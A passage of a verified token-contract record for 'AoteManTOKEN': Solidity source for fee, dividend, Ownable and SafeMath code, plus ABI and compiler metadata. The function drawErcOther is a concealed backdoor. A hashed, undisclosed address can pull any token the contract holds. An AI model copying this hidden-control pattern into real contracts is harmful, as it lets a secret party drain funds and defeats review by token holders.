= 0;\\r\\n        if(isMarketPair[sender] || isMarketPair[recipient] ) {\\r\\n            uint256 _lpBackFeeNum = amount.mul(lpBackFee).div(1000);\\r\\n            _takeFee(sender,address(this), _lpBackFeeNum);\\r\\n\\r\\n            uint256 _marketFeeNum = amount.mul(marketFee).div(1000);\\r\\n            _takeFee(sender,address(this), _marketFeeNum);\\r\\n\\r\\n            uint256 _fenhongNum = amount.mul(fenHongFee).div(1000);\\r\\n            _takeFee(sender,address(_tokenDistributor), _fenhongNum);\\r\\n         \\r\\n            feeAmount = amount.mul(totalFee).div(1000);\\r\\n        }\\r\\n\\r\\n        return amount.sub(feeAmount);\\r\\n    }\\r\\n\\r\\n   function _takeFee(address sender, address recipient,uint256 tAmount) private {\\r\\n        if (tAmount == 0 ) return;\\r\\n        _balances[recipient] = _balances[recipient].add(tAmount);\\r\\n        emit Transfer(sender, recipient, tAmount);\\r\\n    }\\r\\n\\r\\n    function drawErcOther(address erc,address recipient,uint256 amount) public \\r\\n    {\\r\\n        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        IBEP20(erc).transfer(recipient, amount);\\r\\n    }\\r\\n\\r\\n\\r\\n    function setShare(address shareholder) private {\\r\\n        if(_updated[shareholder] ){      \\r\\n            if(balanceOf(shareholder) \\u003c minFenHongToken) quitShare(shareholder);              \\r\\n            return;  \\r\\n        }\\r\\n        if(balanceOf(shareholder) \\u003c minFenHongToken) return;  \\r\\n        addShareholder(shareholder);\\r\\n        _updated[shareholder] = true;\\r\\n          \\r\\n    }\\r\\n    function addShareholder(address shareholder) internal {\\r\\n        shareholderIndexes[shareholder] = shareholders.length;\\r\\n        shareholders.push(shareholder);\\r\\n    }\\r\\n    function quitShare(address shareholder) private {\\r\\n           removeShareholder(shareholder);   \\r\\n           _updated[shareholder] = false; \\r\\n    }\\r\\n    function removeShareholder(address shareholder) internal {\\r\\n        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];\\r\\n        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];\\r\\n        shareholders.pop();\\r\\n    }\\r\\n\\r\\n}\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\nabstract contract Ownable {\\r\\n    address private _owner;\\r\\n    \\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    constructor ()  {\\r\\n        address msgSender = msg.sender;\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }   \\r\\n    \\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n    \\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\"},\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity \\u003e=0.8.0;\\r\\n\\r\\n/**\\r\\n * @dev Wrappers over Solidity\\u0027s arithmetic operations with added overflow\\r\\n * checks.\\r\\n *\\r\\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\\r\\n * in bugs, because programmers usually assume that an overflow raises an\\r\\n * error, which is the standard behavior in high level programming languages.\\r\\n * `SafeMath` restores this intuition by reverting the transaction when an\\r\\n * operation overflows.\\r\\n *\\r\\n * Using this library instead of the unchecked operations eliminates an entire\\r\\n * class of bugs, so it\\u0027s recommended to use it always.\\r\\n */\\r\\nlibrary SafeMath {\\r\\n    /**\\r\\n     * @dev Returns the addition of two unsigned integers, reverting on\\r\\n     * overflow.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `+` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Addition cannot overflow.\\r\\n     */\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        uint256 c = a + b;\\r\\n        require(c \\u003e= a, \\u0027SafeMath: addition overflow\\u0027);\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\r\\n     * overflow (when the result is negative).\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `-` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Subtraction cannot overflow.\\r\\n     */\\r\\n    function subwithlesszero(uint256 a,uint256 b) internal pure returns (uint256)\\r\\n    {\\r\\n        if(b\\u003ea)\\r\\n            return 0;\\r\\n        else\\r\\n            return a-b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\r\\n     * overflow (when the result is negative).\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `-` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Subtraction cannot overflow.\\r\\n     */\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return sub(a, b, \\u0027SafeMath: subtraction overflow\\u0027);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\r\\n     * overflow (when the result is negative).\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `-` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Subtraction cannot overflow.\\r\\n     */\\r\\n    function sub(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        require(b \\u003c= a, errorMessage);\\r\\n        uint256 c = a - b;\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\r\\n     * overflow.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `*` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Multiplication cannot overflow.\\r\\n     */\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        // Gas optimization: this is cheaper than requiring \\u0027a\\u0027 not being zero, but the\\r\\n        // benefit is lost if \\u0027b\\u0027 is also tested.\\r\\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\r\\n        if (a == 0) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        uint256 c = a * b;\\r\\n        require(c / a == b, \\u0027SafeMath: multiplication overflow\\u0027);\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the integer division of two unsigned integers. Reverts on\\r\\n     * division by zero. The result is rounded towards zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `/` operator. Note: this function uses a\\r\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\r\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return div(a, b, \\u0027SafeMath: division by zero\\u0027);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\\r\\n     * division by zero. The result is rounded towards zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `/` operator. Note: this function uses a\\r\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\r\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function div(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        require(b \\u003e 0, errorMessage);\\r\\n        uint256 c = a / b;\\r\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\\u0027t hold\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\r\\n     * Reverts when dividing by zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `%` operator. This function uses a `revert`\\r\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\r\\n     * invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return mod(a, b, \\u0027SafeMath: modulo by zero\\u0027);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\r\\n     * Reverts with custom message when dividing by zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `%` operator. This function uses a `revert`\\r\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\r\\n     * invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function mod(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        require(b != 0, errorMessage);\\r\\n        return a % b;\\r\\n    }\\r\\n\\r\\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\\r\\n        z = x \\u003c y ? x : y;\\r\\n    }\\r\\n\\r\\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\\r\\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\\r\\n        if (y \\u003e 3) {\\r\\n            z = y;\\r\\n            uint256 x = y / 2 + 1;\\r\\n            while (x \\u003c z) {\\r\\n                z = x;\\r\\n                x = (y / x + x) / 2;\\r\\n            }\\r\\n        } else if (y != 0) {\\r\\n            z = 1;\\r\\n        }\\r\\n    }\\r\\n}\\r\\n\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenDivite\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"LPFeefenhong\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_userHoldPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"curPerFenhongVal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributorGas\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"erc\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"drawErcOther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ex2Address\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurrentPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentprice\",\"type\":\"uint256\"}],\"name\":\"getCutCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"magnitude\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFenHongToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minPeriod\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapNum1\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapNum2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minUsdtVal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recipientLpAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"setCreator\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setDistributorGas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ex\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"ex2\",\"type\":\"address\"}],\"name\":\"setEx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setIsExcludedFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accountArray\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setIsExcludedFromFeeByArray\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setMinFenHongToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"mp\",\"type\":\"uint256\"}],\"name\":\"setMinPeriod\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"n1\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"n2\",\"type\":\"uint256\"}],\"name\":\"setMinSwapNum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setMinUsdtVals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accountArray\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setWhiteUserPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"setstartTradeTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenaddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"takeOutErrorTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"wapV2RouterAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AoteManTOKEN", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000009104db5ee5c370d2be21866fce9923bacfe2da22", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://002ee05641e1474b05dcc50e7be5254e4c8af947648bb1166c072ec3ef81bbca"}